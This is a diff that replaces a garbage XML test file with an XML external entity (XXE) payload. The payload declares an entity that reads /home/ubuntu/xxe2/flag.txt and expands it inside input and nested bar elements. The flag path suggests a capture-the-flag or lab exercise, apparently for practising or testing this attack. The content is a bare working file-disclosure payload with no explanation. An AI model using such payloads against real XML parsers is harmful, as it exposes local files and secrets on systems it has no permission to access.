@@ -1,3 +1,10 @@
-<?xml version="1.0" encoding="utf-8"?>
-
-<test>hDIAFFDHGLPEHGTU<>"?AGLRPT;N,L
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE doc [
+<!ENTITY otherFile SYSTEM "/home/ubuntu/xxe2/flag.txt">
+]>
+<input>&otherFile;</input>
+<doc>
+  <foo>
+    <bar>&otherFile;</bar>
+  </foo>
+</doc>
